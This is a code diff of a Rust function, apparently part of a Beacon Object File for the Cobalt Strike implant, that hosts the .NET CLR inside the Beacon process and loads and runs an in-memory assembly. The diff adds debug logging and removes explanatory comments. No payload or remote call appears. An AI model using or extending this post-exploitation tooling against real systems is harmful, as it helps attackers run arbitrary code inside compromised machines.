@@ -57,25 +57,38 @@ pub unsafe fn run(
     pipe_handle: usize,
 ) -> Result<(), BofError> {
     unsafe {
+        crate::dlog2(b"[netfx] start_clr");
         let host = start(info)?;
+        crate::dlog2(b"[netfx]   start_clr ok");
+
+        crate::dlog2(b"[netfx] create_domain");
         let domain = create_domain(&host, app_domain)?;
-        // Bypass STD_OUTPUT_HANDLE entirely (which is 0 in Beacon's host
-        // process). Pass the raw pipe write handle to FlushHelper as a hex
-        // string; FlushHelper builds a FileStream directly from it and
-        // replaces Console.Out/Error.  This is the ONLY path that survives
-        // Beacon hosts that ignore SetStdHandle.
+        crate::dlog2(b"[netfx]   create_domain ok");
+
         let handle_hex = format!("{:x}", pipe_handle);
+        crate::dlog2(b"[netfx] flush(pre)");
         crate::flush::do_flush(&domain, "pre", &handle_hex);
+        crate::dlog2(b"[netfx]   flush(pre) returned");
+
+        crate::dlog2(b"[netfx] nlog_config");
         crate::nlog::do_nlog_config(&domain);
+        crate::dlog2(b"[netfx]   nlog_config returned");
+
+        crate::dlog2(b"[netfx] load_assembly");
         let assembly = load_assembly(&domain, asm_bytes)?;
+        crate::dlog2(b"[netfx]   load_assembly ok");
+
+        crate::dlog2(b"[netfx] invoke");
         let result = invoke(&assembly, asm_args, entry_point_flag);
-        // Post-flush: re-arm Console.Out/Error in case the user assembly
-        // replaced them, and ensure any remaining buffered data is written
-        // before drain() closes the pipe write end.
+        crate::dlog2(b"[netfx]   invoke returned");
+
+        crate::dlog2(b"[netfx] flush(post)");
         crate::flush::do_flush(&domain, "post", &handle_hex);
-        // Stop the CLR execution engine so background managed threads cannot
-        // call ExitProcess after this BOF returns control to Beacon.
+        crate::dlog2(b"[netfx]   flush(post) returned");
+
+        crate::dlog2(b"[netfx] stop_clr");
         stop_clr(&host);
+        crate::dlog2(b"[netfx]   stop_clr returned");
         result
     }
 }
